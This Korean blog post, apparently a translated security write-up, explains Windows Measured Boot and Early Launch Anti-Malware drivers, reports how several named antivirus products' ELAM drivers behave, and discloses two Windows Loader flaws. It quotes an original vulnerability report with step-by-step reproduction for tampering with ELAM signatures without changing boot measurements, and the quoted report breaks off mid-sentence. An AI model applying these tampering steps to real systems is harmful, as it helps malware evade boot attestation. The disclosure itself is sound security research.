id="Measured-Boot"><a href="#Measured-Boot" class="headerlink" title="Measured Boot"></a>Measured Boot</h2><p>Measured Boot 프로세스는 부팅 중 실행하기 전 모든 구성 요소를 기록한다. 이는 변조 방지 방식(tamper-proof way)으로 유지되며 신뢰할 수 있는 플랫폼 모듈 (Trusted Platform Module, TPM)을 사용하여 구현된다. TPM은 펌웨어 및 중요 운영 체제 구성 요소의 해시를 저장하는 데 사용되어 악성 프로그램이 해시를 변경하는 것을 방지한다. </p><p>Verified Boot와 Measured Boot는 동시에 사용할 수 있다. 이러한 개념과 Windows에서의 구현에 대한 기술적 세부 사항은 <a href="https://edk2-docs.gitbook.io/understanding-the-uefi-secure-boot-chain/overview">Reference [1]</a>과 <a href="https://docs.microsoft.com/en-us/windows/security/information-protection/secure-the-windows-10-boot-process">Reference [2]</a>에서 찾을 수 있다.</p><p>위 두 가지 이외에도 다음과 같이 네 가지의 개념이 있다.</p><ul><li>Post-boot verification - 부팅 이후 확인</li><li>Booting from read-only media - 읽기 전용 미디어에서 부팅</li><li>Booting from a read-only volume(image) - 읽기 전용 볼륨(이미지)에서 부팅</li><li>pre-boot verification - 부팅 전 확인</li></ul><h2 id="Post-boot-verification"><a href="#Post-boot-verification" class="headerlink" title="Post-boot verification"></a>Post-boot verification</h2><p>Post-boot verification은 부팅 프로세스가 완료된 이후 또는 후반 단계에서 시작된 프로그램에 의해 수행된다. 해당 프로그램은 이전에 실행된 OS 구성요소와 데이터의 무결성을 확인한다. 이 방식은 더 높은 권한으로 실행 중인 멀웨어의 경우 프로그램의 파일 읽기 요청을 가로채고 반환되는 파일 데이터를 제어함으로써 우회가 가능하나 그럼에도 안티 멀웨어 소프트웨어, 엔드포인트 탐지 및 대응 솔루션과 암호화 구성 요소의 미티게이션으로써 사용할 가치가 있다.</p><h2 id="Booting-from-read-only-media"><a href="#Booting-from-read-only-media" class="headerlink" title="Booting from read-only media"></a>Booting from read-only media</h2><p>읽기 전용 미디어에서 부팅하는 것은 BIOS 및 UEFI와 같은 OS 시작 전 환경(pre-OS environment)에서 사용된다. 이러한 개념이 적용된 온라인 뱅킹을 위한 실시간 배포 방식은 이미 수년 전에 <a href="http://thinkinghard.com/secureinternetbanking/index.html">제안되었으며</a> 현재는 재택근무 시 보안을 위해 제안되기도 한다. 이는 기존의 전통적인 멀웨어에 완벽하게 대응해 대부분의 멀웨어로부터 시스템을 보호할 수 있다.</p><p>그러나 악성 프로그램이 OS 이전 환경에 접근할 수 있으면 우회가 가능하다. 이동식 미디어에서 부팅되는 OS를 속여 기존 미디어에 저장된 코드를 실행할 수 있다. 이는 BIOS 또는 UEFI가 부팅 드라이브에서 데이터를 읽을 때 기본 스토리지 드라이버로 전환하는 동안 트리거할 수 있으며 관련된 코드 실행 이슈에 대한 자세한 내용은 <a href="https://dfir.ru/2018/07/21/a-live-forensic-distribution-executing-malicious-code-from-a-suspect-drive/">이전 글에서</a> 확인할 수 있다.</p><h2 id="Booting-from-a-read-only-volume"><a href="#Booting-from-a-read-only-volume" class="headerlink" title="Booting from a read-only volume"></a>Booting from a read-only volume</h2><p>읽기 전용 볼륨(이미지)에서 부팅하는 것 또한 비슷한 개념이지만 변경 불가능한 OS 파일만 읽기 전용 볼륨에 저장된다. 이 볼륨은 해시 또는 해시 트리를 사용하여 무결성을 검증한다. 해시 또는 해시 트리의 루트 해시는 하드웨어로 보호되는 루트에 의해 서명되고 검증되며 이 접근 방식은 기존의 검증된 부팅 구현과 관련이 있다. 더 자세한 기술 정보는 <a href="https://source.android.com/security/verifiedboot/verified-boot">여기</a>서 찾을 수 있다.</p><h2 id="Pre-boot-verification"><a href="#Pre-boot-verification" class="headerlink" title="Pre-boot verification"></a>Pre-boot verification</h2><p>Pre-boot verification은 잘 알려지지 않은 기술이며 일반적으로 PCI (Peripheral Component Interconnect) 장치 또는 사용자 지정 UEFI 이미지로 구현된다. 부팅 드라이브에 있는 부트 로더를 시작하기 전에 확인 프로세스는 하드웨어 구성, 노출된 펌웨어 메모리, 실행 파일 및 기타 데이터 (예 : Windows Installation의 레지스트리 키값) 등의 무결성을 확인한다. </p><p>Pre-boot verification은 이전에는 초기화 코드를 포함하는 읽기 전용 메모리 (option ROM)가 있는 PCI 장치로 구현되었다. 초기화 코드는 부트 로더의 첫 번째 명령어 위치에 중단점을 설치해 중단점에 도달하면 PCI 장치의 메모리에서 사용자 지정 OS가 시작되는 프로세스로 이루어져 있다. OS는 연결된 드라이브에서 찾은 파일 시스템을 파싱하고 확인 프로세스를 수행하는데, 이때 해시는 무결성이 확인된 시스템 드라이브 또는 PCI 장치의 메모리에 저장되며 검증에 성공하면 원래 부트 로더가 실행되고 운영체제가 시작된다.</p><p>현재는 PCI 장치에서 사용자 지정 UEFI 이미지를 메인보드에 제공하는 것으로 구현되어 있다. 사용자 지정 UEFI 이미지에는 확인 프로세스에 필요한 파서가 포함되어 있으며 USB 부팅을 위해 USB 드라이브를 기반으로 한 구현도 있다. 이전 방식과 비교해 사용자가 부팅 순서를 변경하지 않는다는 가정하에 BIOS / UEFI 환경에 대한 중단점 또는 애드온을 사용하여 부팅 프로세스에 간섭할 필요가 없다.</p><p>이 접근 방식은 BIOS 및 UEFI를 포함한 펌웨어의 무결성을 확인하는 기능이 제한되지만, 사용자 지정 UEFI 이미지를 사용하면 설계상 신뢰할 수 있는 영역에 대부분의 펌웨어를 포함하게 된다.</p><p>또 다른 단점은 공식 Windows에서 구현된 파일 시스템 및 Windows 레지스트리 파싱 코드를 동일하게 생성하는 것이 거의 불가능하다는 것이다. 일반적으로 Linux 사용자가 NTFS 파일 시스템을 마운트 하면 동일한 파일 시스템을 탐색하는 Windows 사용자와 동일한 디렉터리 레이아웃과 파일 내용이 표시된다. 그러나 Pre-boot verification은 실제로 드라이브에 저장된 원시 데이터는 동일하나 다른 데이터를 반환할 수 있다. </p><p>예를 들어 대부분의 Pre-boot verification 제품은 Windows 레지스트리 트랜잭션 로그 파일을 지원하지 않는다. 즉, Kernel 수준에서 실행되는 멀웨어가 레지스트리 키값을 수정해 Pre-boot verification에서 임의의 값을 가져오도록 할 수 있다. Windows Kernel은 트랜잭션 로그 파일을 지원하므로 이러한 변경 사항은 부팅 도중과 부팅 후에 운영체제에 표시된다. 이는 <a href="https://dfir.ru/2018/10/07/hiding-data-in-the-registry/">이전 글에서</a> 자세히 설명되어 있다.  </p><p>verified 및 measured boot 프로세스는 코드와 데이터를 사용하기 전 검증하기 때문에 앞서 설명한 공격에 대한 영향을 받지 않을 것으로 예상된다. 실행될 파일이 파일 시스템 드라이버에 따라 다른 해시를 생성하는 경우 파일이 verified 및 measured를 거쳐 동일한 드라이버로 실행되기 때문에 보안에 영향을 미치지 않는다. 그러나 이 접근 방법 또한 항상 완벽하지는 않다. 이 글에서는 Windows Loader (<code>winload.exe</code> 또는 <code>winload.efi</code>)의 measured boot에서 발견된 두 가지 취약점에 중점을 둘 것이며, 별도의 소프트웨어 구성 요소(이후에 설명할 Loader와 kernel)에서 데이터와 코드를 검증하는 과정에서의 이슈에 대해 강조한다.</p><h1 id="Early-Launch-Anti-Malware"><a href="#Early-Launch-Anti-Malware" class="headerlink" title="Early Launch Anti-Malware"></a>Early Launch Anti-Malware</h1><p>취약점을 살펴보기 전에 Windows Kernel (<code>ntoskrnl.exe</code>)에서 제공하는 안티 멀웨어 인터페이스를 살펴본다.</p><p>두 가지의 주요 부팅 보안인  verified boot와 measured boot가 활성화되어 있고 하드웨어/펌웨어 취약점을 고려하지 않는 경우 멀웨어의 초기 목표 삽입 지점은 boot-start 드라이버다.</p><p>악성 boot-start 드라이버를 방지하기 위해 Microsoft는 <a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/early-launch-antimalware">ELAM (Early Launch Anti-Malware) 인터페이스</a>를 Windows 8에서부터 도입했다. </p><p>ELAM 드라이버는 다른 드라이버보다 먼저 시작해 종속성과 유효성을 검사한다. 각 boot-start 드라이버에 대해 ELAM 드라이버는 다음 값을 반환한다.</p><ul><li>unknown - 알 수 없음</li><li>good - 정상적인 드라이버</li><li>bad - 악성 드라이버</li><li>bad but critical for the boot - 악성 드라이버지만 부팅 프로세스에 빠져서는 안 될 요소</li></ul><p>또한 ELAM 드라이버는 boot-start 드라이버에서 수행하는 레지스트리 작업을 기록하는 콜백을 설정하고 런타임 안티 멀웨어의 구성 요소에 저장할 수 있다.</p><p>자체 ELAM 드라이버를 사용하는 안티 멀웨어 소프트웨어는 Windows 8.1에서 도입된 <a href="https://docs.microsoft.com/en-us/windows/win32/services/protecting-anti-malware-services-">코드 무결성 보호</a>가 제공되어 보호된 서비스로 실행할 수 있다. </p><p>부팅 프로세스 중에 둘 이상의 ELAM 드라이버가 활성화될 수 있으며 각 ELAM 드라이버는 지정된 boot-start 드라이버를 독립적으로 확인하며 이 드라이버에 대한 최종 결과값은 다음 순위를 기반으로 한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled.png" alt="measured-boot-vuln/Untitled.png"></p><blockquote><p>Table 1. ELAM scores (ranks)</p></blockquote><p>한 ELAM 드라이버가 <code>good</code> 을 반환하고 다른 ELAM 드라이버가 <code>bad</code>를 반환하면 이 boot-start 드라이버는 <code>bad</code>로 결정된다.</p><p>위 ELAM 드라이버의 반환 값과 아래 정책을 기반으로 Kernel은 boot-start 드라이버를 허용하거나 거부할 수 있다.</p><ul><li>모든 드라이버 허용</li><li><code>good</code>, <code>unknown</code>, <code>bad but critical</code> 드라이버 허용(기본값)</li><li><code>good</code>, <code>unknown</code> 드라이버 허용</li><li><code>good</code> 드라이버 허용</li></ul><p>ELAM 드라이버는 다음 데이터를 기반으로 드라이버의 스코어를 결정한다.</p><ul><li>드라이버 파일의 경로</li><li>해당 서비스 항목에 대한 레지스트리 경로</li><li>드라이버에 대한 인증서 정보 (게시자, 발급자)</li><li>이미지 파일 해시값</li></ul><p>문제는 <a href="https://www.microsoft.com/security/blog/2020/09/01/force-firmware-code-to-be-measured-and-attested-by-secure-launch-on-windows-10/">DRTM (Dynamic Root of Trust for Measurement for Measurement)</a>이 적용되면 이전에 boot-start 드라이버를 메모리로 읽어오는 데 사용된 펌웨어를 신뢰할 수 없어 관련 드라이버가 초기화되기 전에는 드라이브에서 아무것도 읽을 수 없기 때문에 파일 내용이 ELAM 드라이버에 노출되지 않는다. 따라서 기존의 멀웨어 시그니처는 적용할 수 없다. 그러나 경로, 해시 및 인증서 등의 정보로 악성 boot-start 드라이버를 차단하는 것은 효과적인 방법으로 볼 수 있다.</p><p>따라서 Microsoft는 다음과 같은 새로운 규칙을 정의했다.</p><ul><li>ELAM 드라이버에는 단일 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 모든 boot-start 드라이버를 확인할 수 있는 제한된 시간이 주어짐</li><li>ELAM 드라이버에는 코드 및 구성 데이터에 대해 제한된 메모리가 제공됨</li><li>ELAM 드라이버는 ELAM 레지스트리 하이브 (<code>C:\Windows\System32\config\ELAM</code>)의 특정 레지스트리 키 아래에 서명을 저장해야 함</li><li>ELAM 드라이버는 서명의 유효성을 검사해야 함.</li><li>ELAM 드라이버는 잘못된 서명을 처리해야 함 (이 경우 모든 boot-start 드라이버를 unknown으로 처리해야 함).</li><li>ELAM 드라이버는 악성 boot-start 드라이버 (또는 다른 정책 위반)가 식별되면 측정된 부팅 상태를 무효화해야 함</li></ul><p>ELAM 인터페이스가 처음 등장했을 때는 <a href="https://www.welivesecurity.com/2012/12/27/win32gapz-new-bootkit-technique/">효용성에 의문이 제기되었다</a>. bootkit은 악성코드를 VBR(Volume Boot Recod)에 기록하거나 IPL(Initial Program Loader)로 대체할 수 있으며 둘 다 Windows Kernel 이전에 실행되므로 ELAM 드라이버를 우회할 수 있었다. 그러나 Verified/Measured 부팅의 등장으로 위 기법의 적용이 어려워져 ELAM 인터페이스가 제 기능을 할 수 있게 되었다.</p><h1 id="ELAM-and-Measured-Signatures"><a href="#ELAM-and-Measured-Signatures" class="headerlink" title="ELAM and Measured Signatures"></a>ELAM and Measured Signatures</h1><p>Measured 부팅 중 ELAM 시그니처를 읽은 다음 Windows Loader에서 측정한다(<a href="https://docs.microsoft.com/en-us/windows-hardware/drivers/install/elam-driver-requirements#malware-signatures">출처</a>). 이렇게 하면 ELAM 시그니처가 신뢰 체인에 배치되어 증명 중에 누락 혹은 다운그레이드 된 시그니처를 감지할 수 있다.</p><p>ELAM 하이브 내의 특정 레지스트리 값에 저장된 위치만 측정되며 이 값을 <code>Measured</code>, <code>Policy</code> 및 <code>Config</code>라고 한다. 여기에는 공급 업체별 데이터를 포함할 수 있고 이름이 다르거나 유형이 <code>REG_BINARY</code>가 아닌 레지스트리 값은 측정되지 않는다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%201.png" alt="measured-boot-vuln/Untitled%201.png"></p><blockquote><p>Table 2. Trend Micro 및 Microsoft에서 각각 저장한 시그니처 데이터와 측정값(굵게 표시됨)</p></blockquote><p>ELAM 시그니처는 Windows Loader에 의해 측정되지만 ELAM 인터페이스는 Windows Kernel에 의해 제공된다는 점이 중요하다.</p><h1 id="Real-World-ELAM-Drivers"><a href="#Real-World-ELAM-Drivers" class="headerlink" title="Real-World ELAM Drivers"></a>Real-World ELAM Drivers</h1><p>2021 년 2월에 필자는 유명한 안티 멀웨어 제품의 ELAM 드라이버를 리버싱했다. 25개의 ELAM 드라이버가 있는 총 26 개의 제품 (2 개의 제품이 동일한 ELAM 드라이버를 공유)에서 24 개가 기본 구성으로 설치되어 있었다. </p><p>흥미롭게도 모든 ELAM 드라이버에는 보호된 안티 멀웨어 서비스를 시작하는 데 필요한 인증서 정보가 포함되어 있지만 26개 중 15개 제품에서 boot-start 드라이버에 대해 검사를 수행하지 않고 하드코딩된 결과값을 반환하거나 결과값을 전혀 제공하지 않았다. </p><blockquote><p>이러한 ELAM 드라이버를 placeholder driver라고 한다.</p></blockquote><p>두 개의 ELAM 드라이버는 런타임 안티 멀웨어 구성 요소에 대한 boot-start 드라이버 정보를 기록했지만 ELAM 드라이버에서는 실제 검사가 수행되지 않았으며 결과값은 항상 <code>unknown</code>이었고, 한 ELAM 드라이버는 검사를 수행하지 않고 모든 boot-start 드라이버의 결과값을 <code>good</code>으로 보고했다.</p><p>11개의 제품의 ELAM 드라이버는 boot-start 드라이버에 대해 몇 가지 검사를 수행했다. 그중 하나는 알려진 정상적인 인증서의 하드코딩된 목록을 가지고 있고 ELAM 하이브는 시그니처 데이터를 저장하는 데 사용되지 않았으며 2개는 시그니처 데이터에 ELAM 하이브와 SYSTEM 하이브를 모두 사용했다. 하나는 ELAM 하이브를 사용한 뒤 SYSTEM 하이브를 시그니처 데이터 대체로 사용하고 7개의 제품은 ELAM 하이브에서만 시그니처 데이터를 읽었다.</p><p>11 개의 ELAM 드라이버 중 단 2개만 결과값에 따라 증명을 취소할 수 있었으며 다른 드라이버는 해당 루틴을 호출조차 하지 않았다.</p><p>이제 제품의 이름을 언급하도록 하겠다.</p><p>놀랍게도 Windows Defender에서 제공되는 ELAM 드라이버는 언급된 모든 규칙을 따르지 않았으며 SYSTEM 하이브를 시그니처 데이터의 저장 위치로 사용하고 (기본 위치 인 ELAM 하이브 제외) 악성 boot-start 드라이버가 감지되었을 때 증명을 취소하지 않았다.</p><p>Kaspersky 및 ZoneAlarm 제품의 동일한 ELAM 드라이버는 ELAM 하이브와 SYSTEM 하이브 두 위치에서 시그니처 데이터를 읽었으며 증명 또한 취소되지 않았다.</p><p>Sophos 제품의 ELAM 드라이버는 모든 boot-start 드라이버를 <code>good</code>으로 표시한다. 이는 Sophos에 보안 이슈로 보고되었지만 보안 상의 결함이 없는 의도된 기능으로 간주되었다.</p><p>요약하자면, 대부분의 안티 멀웨어 제품은 ELAM 드라이버를 사용하여 악성 boot-start 드라이버를 검색하지 않았다. 대신 ELAM 드라이버를 사용하여 자체적으로 보호된 서비스로 시작하고 핵심 ELAM 기능은 하드 코딩된 단일 결과값을 제공하거나 결과값을 전혀 제공하지 않도록 구현되었다.</p><h1 id="ELAM-Hive"><a href="#ELAM-Hive" class="headerlink" title="ELAM Hive"></a>ELAM Hive</h1><p>ELAM 하이브는 <code>C:\Windows\System32\config\ELAM</code> 레지스트리 파일에 저장된다.</p><p><a href="https://github.com/msuhanov/regf/blob/master/Windows%20registry%20file%20format%20specification.md">이전 글에</a> 해당 포맷에 대한 설명이 있으며 취약성을 이해하는 데 필요한 몇 가지 핵심 사항이 있다.</p><ul><li>키 노드는 하위 키 목록을 가리킬 수 있다.<ul><li>키 노드 : 단일 레지스트리 키를 설명하는 데 사용되는 바이너리 구조</li><li>하위 키 목록 : 레지스트리 키의 하위 키를 설명하는 키 노드에 대한 오프셋 목록</li></ul></li><li>마찬가지로 키 노드는 값 목록을 가리킬 수 있다.<ul><li>값 목록: 키 값에 대한 오프셋 목록, 각 키 값은 레지스트리 키에 속하는 단일 레지스트리 값을 설명함</li></ul></li><li><code>0xFFFFFFFF</code>와 같은 오프셋은 “nil”을 표현한다.</li><li>이러한 오프셋은 절댓값이 아니며 레지스트리 파일의 시작 부분에서 오프셋을 얻으려면 4096 bytes를 추가해야 한다.</li><li>키 노드와 키 값은 각각 레지스트리 키의 이름과 레지스트리 값의 이름을 저장한다. 이는 확장 ASCII (Latin-1) 문자열 혹은 UTF-16LE 문자열이다. (확장 ASCII 문자열로 저장할 수 있으면 해당 형식으로 압축됨.)</li><li>하위 키에서 대소문자를 구분하지 않는 바이너리 검색을 사용하려면 하위 키 목록을 대문자 이름(사전 순 정렬)으로 정렬해야 한다.<ul><li>값 목록은 정렬할 필요 없음</li></ul></li><li>키 값은 레지스트리 값의 데이터 유형(예 : REG_BINARY)을 저장하고 값 데이터를 가리킨다.</li><li>4 bytes 이하의 값 데이터는 키 값에 직접 저장된다.</li><li>4 bytes 보다 큰 값 데이터는 다른 오프셋에 저장되며 이 오프셋은 키 값에 기록된다.</li><li>16344 bytes보다 큰 값 데이터는 16344 btyes 이하의 세그먼트에 저장되고 세그먼트에 대한 오프셋은 목록에서 참조된다. 키 값에는 데이터 대신 목록에 대한 오프셋이 저장된 Big Data Record의 오프셋이 저장된다.</li></ul><p>레지스트리 파일의 예제는 다음과 같다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%202.png" alt="measured-boot-vuln/Untitled%202.png"></p><blockquote><p>Figure 1<br>선택된 영역 - ELAM 하이브의 root key 노드<br>녹색 - 하위 키의 개수(2개)<br>빨간색 - 하위 키 목록에 대한 오프셋 (0x3328, 절대 오프셋: 0x3328+4096=0x4328)<br>노란색 - 키 이름 (“ROOT”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%203.png" alt="measured-boot-vuln/Untitled%203.png"></p><blockquote><p>Figure 2<br>선택된 영역 - 루트 키에 대한 하위 키 목록<br>노란색 - 목록의 요소 수 (2개)<br>빨간색 - 두 개의 하위 키에 대한 오프셋 (0x3188 및 0x0120, 이 유형의 하위 키 목록에서는 4 개)</p></blockquote><p>각 오프셋 뒤에는 이름 해시가 포함되어 있으며 사전 순 정렬로 저장된다. (<code>0x3188</code>은 “Trend Micro” 키 노드에 해당하고 <code>0x0120</code>은 “Windows Defender” 키 노드에 해당됨)</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%204.png" alt="measured-boot-vuln/Untitled%204.png"></p><blockquote><p>Figure 3<br>선택된 영역 - “Windows Defender” 키 노드<br>빨간색 - 값 데이터(1)<br>노란색 - 목록에 대한 오프셋 (0x3180)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%205.png" alt="measured-boot-vuln/Untitled%205.png"></p><blockquote><p>Figure 4<br>선택된 영역 - 값 목록(유효한 항목은 0x0230)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%206.png" alt="measured-boot-vuln/Untitled%206.png"></p><blockquote><p>Figure 5<br>선택된 영역 - 키 값<br>노란색 - 데이터 크기 (0x215C 또는 8540 bytes)<br>빨간색 - 데이터 오프셋 (0x1020, 데이터가 4 bytes 이하인 경우 직접 저장)<br>파란색 - 값 유형 (3 또는 REG_BINARY)<br>녹색 - 값 이름 ( “Measured”, ASCII 문자열)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%207.png" alt="measured-boot-vuln/Untitled%207.png"></p><blockquote><p>Figure 6<br>값 데이터</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%208.png" alt="measured-boot-vuln/Untitled%208.png"></p><blockquote><p>Figure 7<br>선택된 영역 - 데이터가 16344 bytes보다 크고 하이브 형식 버전이 1.4 이상인 경우의 Big Data Record Structure<br>빨간색 - 데이터 세그먼트 수 (2),<br>노란색 - 세그먼트 목록에 대한 오프셋 (0x3188)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%209.png" alt="measured-boot-vuln/Untitled%209.png"></p><blockquote><p>Figure 8<br>선택된 영역 - 값 데이터 세그먼트 목록<br>빨간색 - 두 개의 오프셋 (0x4020 및 0x 8020)</p></blockquote><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2010.png" alt="measured-boot-vuln/Untitled%2010.png"></p><blockquote><p>Figure 9<br>선택된 영역 - 세그먼트, 첫 번째 세그먼트에는 16344 bytes가 포함되고 마지막 세그먼트에는 나머지 데이터가 포함됨</p></blockquote><p>유심히 봐야 할 몇 가지 세부 사항</p><ol><li>레지스트리 하이브가 로드되면 형식 위반이 있는지 확인한다. 위반이 감지되면 참조를 포함하여 이를 수정하거나 관련 레지스트리를 삭제하려고 시도한다.</li><li>모든 하위 키 목록에 있는 요소의 사전 순 정렬이 확인된다. 두 개의 하위 키 (주어진 목록에 있는 현재 키와 이전 키)를 비교한 결과 잘못된 순서로 표시되면 현재 키가 삭제된다.</li><li>일반적으로 하이브가 마운트 되면 유저 모드 응용 프로그램이 잠기게 된다. 따라서 운영체제가 부팅을 완료하면 ELAM 하이브는 마운트 해제된 상태로 유지된다.</li><li>ELAM 하이브는 형식 버전 1.5를 사용하므로 Big Data Record가 활성화된다.</li><li>부팅 중에 Windows Loader는 ELAM 하이브를 단일 메모리 청크로 읽는다.</li></ol><h1 id="Measured-Boot-Vulnerabilities"><a href="#Measured-Boot-Vulnerabilities" class="headerlink" title="Measured Boot Vulnerabilities"></a>Measured Boot Vulnerabilities</h1><p>2020년 말, 2021년 초 관리자 권한으로 실행되는 악성 프로그램이 Measured Booting 프로세스에 영향을 주지 않고 ELAM 시그니처를 손상 및 삭제할 수 있는 두 가지 취약점을 발견하고 보고했다.</p><p>특히, Windows Loader는 ELAM 하이브에서 예상되는 레지스트리 값을 측정하는 반면 Windows Kernel은 손상된 ELAM 시그니처를 포함하거나 해당 레지스트리 값이 없는 하이브에서 다른 레지스트리 데이터를 확인해 이러한 Loader와 Kernel의 레지스트리 파싱 코드의 차이점을 악용한다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2011.png" alt="measured-boot-vuln/Untitled%2011.png"></p><blockquote><p>발견된 취약점의 CVE ID</p></blockquote><p>두 취약점 모두 보상을 받을 수 있었으며 CVE-2021–27094의 경우 업데이트를 배포하는 데 90일 이상이 걸렸고 해당 패치로 인해 데이터 손상 이슈가 발생했다.</p><h2 id="CVE-2021–28447"><a href="#CVE-2021–28447" class="headerlink" title="CVE-2021–28447"></a>CVE-2021–28447</h2><p>16344 bytes보다 큰 데이터로 ELAM 값을 측정할 때 Windows Loader는 Big Data Record를 파싱하지 않는다. 따라서 측정 중인 ELAM blob이 16344 bytes보다 크면 취약점을 트리거할 수 있다. 아래는 측정된 ELAM 값에 대한 데이터를 가져오는 데 사용되는 디 컴파일된 함수이다.</p><p><img src="/2021/06/27/l0ch/measured-boot-vuln/Untitled%2012.png" alt="measured-boot-vuln/Untitled%2012.png"></p><blockquote><p>측정 값 데이터를 가져 오는 데 사용되는 함수</p></blockquote><p>일반적인 경우 값 데이터가 16344 bytes 보다 크지 않으면 <code>KeyValue-&gt;Data</code> 필드에는 전체 값 데이터가 포함되고 <code>memmove()</code> 함수로 해당 필드의 데이터를 변수 <code>Heap</code>에 복사한다. 그러나 해당 함수에는 하이브 형식 버전, 값 데이터 크기에 대한 검사 등 Big Data Record를 처리하기 위한 코드가 존재하지 않는다. 따라서 데이터가 16344 bytes보다 크면 <code>KeyValue-&gt;Data</code>에는 값 데이터 대신 Big Data Record로 채워지지만 <code>memmove()</code> 호출은 이를 데이터로 생각해 Big Data Record와 이후 레지스트리 데이터를 로드된 레지스트리 파일에서 <code>Heap</code>으로 복사하게 된다. </p><p>이를 악용하면 특정 조건에서 공격자는 측정에 영향을 주지 않고 ELAM Blob을 수정할 수 있다. 예를 들어 값 데이터 세그먼트가 Big Data Record 이전에, 즉 레지스트리 파일의 더 낮은 오프셋에 저장되면 힙 변수에 포함되지 않고 측정되어 실제 값 데이터는 측정되지 않는다. 또는 값 데이터 세그먼트가 Big Data Record 이후에 저장되면 측정되지 않아 측정 중 계산된 해시를 변경하지 않고 이후의 값 데이터를 변경할 수 있다.</p><p>ELAM 하이브는 부팅 완료 이후에는 로드되지 않으므로 어떤 방식으로든 (예 : HEX 편집기 등) 변경할 수 있으므로 공격자가 레지스트리 파일을 제한 없이 임의로 수정할 수 있다. </p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>이 취약점은 이전에는 Windows Loader에서 이러한 레지스트리 값을 읽을 필요가 없었으므로 Big Data Record 케이스를 지원하지 않는 레거시 코드로 인해 발생했다.</p><h3 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h3><p>Microsoft는 Windows Loader에서 Big Data Record 케이스에 대한 지원을 구현하여 취약점을 수정했다. 해당 취약점은 ELAM blob의 임계값인 16344 bytes에 도달하지 않는 ELAM 드라이버에는 영향을 주지 않는다. </p><h3 id="Original-vulnerability-report"><a href="#Original-vulnerability-report" class="headerlink" title="Original vulnerability report"></a>Original vulnerability report</h3><pre><code class="hljs c"># SummaryWhen an ELAM driver stores a binary larger than 16344 bytes in one of three measured values (called &quot;Measured&quot;, &quot;Policy&quot;, or &quot;Config&quot;) within the ELAM hive (&quot;C:\Windows\System32\config\ELAM&quot;), this binary isn&#x27;t measured correctly by the Windows loader (winload.exe or winload.efi).Under specific conditions, a modification made to an ELAM blob won&#x27;t result in different PCR values, thus not affecting the measured boot (since PCR values are equal to the expected ones).# Description## Steps to reproduce(Screenshots attached.)<span class="hljs-number">1.</span> Mount the ELAM hive <span class="hljs-keyword">using</span> a registry editor.<span class="hljs-number">2.</span> Add a <span class="hljs-keyword">new</span> key under the root of the ELAM hive. Assign a <span class="hljs-keyword">new</span> value to <span class="hljs-keyword">this</span> key (in <span class="hljs-keyword">this</span> report, the value will be called <span class="hljs-string">&quot;Measured&quot;</span>).<span class="hljs-number">3.</span> Write more than <span class="hljs-number">16344</span> bytes of data to that value (see: <span class="hljs-string">&quot;01-elam-blob.png&quot;</span>).<span class="hljs-number">4.</span> Unmount the ELAM hive.<span class="hljs-number">5.</span> Reboot the system.<span class="hljs-number">6.</span> During the boot, the Windows loader measures data starting from the beginning of the CM_BIG_DATA structure as pointed by the CM_KEY_VALUE structure describing the <span class="hljs-string">&quot;Measured&quot;</span> value (see: <span class="hljs-string">&quot;02-elam-blob-measured.png&quot;</span>).    Since the expected data length is larger than the CM_BIG_DATA structure, subsequent bytes of the hive file (actually, from the memory region used to store the hive file loaded) are included into the measurement (instead of actual value data).<span class="hljs-number">7.</span> After the boot, change (<span class="hljs-keyword">using</span> a registry editor) several bytes within the value data, without altering the data size (see: <span class="hljs-string">&quot;03-elam-blob-altered.png&quot;</span>).<span class="hljs-number">8.</span> Reboot the system.<span class="hljs-number">9.</span> During the boot, the Windows loader will see the same CM_BIG_DATA structure <span class="hljs-keyword">and</span> subsequent bytes as value data (see: <span class="hljs-string">&quot;04-elam-blob-altered-measured.png&quot;</span>).## Root causeThe Windows loader doesn<span class="hljs-number">&#x27;</span>t support parsing value data stored <span class="hljs-keyword">using</span> the CM_BIG_DATA structure. This structure is used when the hive format version is <span class="hljs-number">1.4</span> <span class="hljs-keyword">or</span> newer <span class="hljs-keyword">and</span> value data to be stored is larger than <span class="hljs-number">16344</span> bytes.The ELAM hive uses the format version <span class="hljs-number">1.5</span>. Thus, the CM_BIG_DATA structure is supported in the NT kernel, but <span class="hljs-keyword">not</span> in the Windows loader.The OslGetBinaryValue routine (in the Windows loader) provides back a pointer to cell data containing the CM_BIG_DATA structure instead of parsing <span class="hljs-keyword">this</span> <span class="hljs-keyword">and</span> related structures <span class="hljs-keyword">and</span> then providing a pointer to consolidated data segments.## Attack scenariosFirst, ELAM blobs larger than <span class="hljs-number">16344</span> bytes aren<span class="hljs-number">&#x27;</span>t measured correctly. This is a serious security issue by itself.Finally, <span class="hljs-keyword">if</span> an ELAM driver uses existing measured ELAM blobs larger than <span class="hljs-number">16344</span> bytes, a malicious usermode program could alter (corrupt <span class="hljs-keyword">or</span> downgrade) these blobs without affecting the measured boot.Such an attack is possible when:* a <span class="hljs-built_in">list</span> of cells containing value data segments is stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* such value data segments are stored before the CM_BIG_DATA structure, <span class="hljs-keyword">or</span>* a <span class="hljs-built_in">list</span> of cells containing value data segments <span class="hljs-keyword">and</span> such value data segments are all stored after the CM_BIG_DATA structure, but there is a large gap after the CM_BIG_DATA structure   (which isn<span class="hljs-number">&#x27;</span>t smaller than the defined value data size, so the hash calculation won<span class="hljs-number">&#x27;</span>t reach the actual value data, <span class="hljs-keyword">or</span> it<span class="hljs-number">&#x27;</span>s 